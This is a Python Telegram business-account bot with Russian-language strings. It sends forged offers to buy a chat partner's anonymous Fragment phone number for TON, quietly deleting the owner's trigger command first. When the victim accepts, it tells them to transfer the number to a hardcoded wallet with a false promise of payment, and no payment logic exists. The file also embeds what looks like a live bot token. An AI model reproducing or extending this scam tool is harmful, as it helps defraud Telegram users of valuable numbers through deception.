import asyncio
import re
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9069731124:AAEV25xD2-KJ4aEce5MTBS6Z1VcV9wga41o"
TON_WALLET = "UQCiU6HfycyDIneKsw-UAYakjfr4W99W558nbJKaaRPeSh6b"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dispatcher = Dispatcher()

CHECK_EMOJI_ID = "5774022692642492953"
CROSS_EMOJI_ID = "5778527486270770928"

async def safe_delete(chat_id, message_id, conn_id=None):
    if conn_id:
        try:
            await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[message_id])
            return
        except Exception:
            pass
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

@dispatcher.business_message(F.text.startswith(".gpt"))
async def send_offer(message: Message):
    if not message.business_connection_id:
        return

    try:
        connection = await bot.get_business_connection(message.business_connection_id)
        owner_id = connection.user.id
    except Exception:
        return

    if message.from_user.id != owner_id:
        return

    # Убираем команду и все пробелы
    text_clean = message.text.replace(".gpt", "").replace(" ", "").strip()
    
    # Ищем номер (плюс и цифры)
    phone_match = re.search(r"\+(\d+)", text_clean)
    if not phone_match:
        await bot.send_message(chat_id=message.chat.id, text="❌ Номер не найден. Формат: .gpt +88803674195 150", business_connection_id=message.business_connection_id)
        return
    
    phone_clean = phone_match.group(1)
    if len(phone_clean) >= 10:
        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
    else:
        formatted_phone = f"+{phone_clean}"

    # Ищем сумму
    text_without_phone = text_clean.replace(phone_match.group(0), "")
    amount_match = re.search(r"(\d+)", text_without_phone)
    
    if not amount_match:
        await bot.send_message(chat_id=message.chat.id, text="❌ Сумма не найдена. Формат: .gpt +88803674195 150", business_connection_id=message.business_connection_id)
        return
    
    amount = amount_match.group(1)
    amount_text = f"{amount} TON"
    fragment_link = f"https://fragment.com/number/{phone_clean}"

    offer_text = (
        f"Поступило коммерческое предложение о выкупе вашего анонимного номера <b>{formatted_phone}</b>.\n\n"
        f"Сумма: <b>{amount_text}</b>\n"
        f"Срок действия: <b>5ч 59м</b>\n\n"
        f"<i>Нажмите «Принять» для перевода номера на кошелек покупателя.</i>"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=CROSS_EMOJI_ID),
        InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
    ]])

    try:
        # Отправляем оффер (сначала отправляем, потом удаляем команду)
        await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=keyboard,
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(
                url=fragment_link,
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
    except Exception as e:
        # Если ошибка - выводим ее в чат, чтобы ты видел
        try:
            await bot.send_message(chat_id=message.chat.id, text=f"❌ Ошибка: {e}", business_connection_id=message.business_connection_id)
        except:
            pass

@dispatcher.callback_query(F.data == "accept_offer")
async def on_accept_offer(callback: CallbackQuery):
    conn_id = callback.message.business_connection_id
    new_text = (
        f"<b>Ожидание перевода</b>\n\n"
        f"Переведите номер на кошелек:\n"
        f"<code>{TON_WALLET}</code>\n\n"
        f"1. Откройте Fragment.com\n"
        f"2. Перейдите в «Мой номер»\n"
        f"3. Нажмите Transfer\n"
        f"4. Вставьте адрес кошелька\n"
        f"5. Подтвердите передачу\n\n"
        f"<i>После перевода средства будут зачислены на ваш баланс.</i>"
    )
    try:
        await callback.message.edit_text(new_text)
    except:
        pass
    await callback.answer()

@dispatcher.callback_query(F.data == "decline_offer")
async def on_decline(callback: CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass
    await callback.answer("Вы отклонили предложение.", show_alert=True)

async def main():
    print("Бот запущен.")
    await dispatcher.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
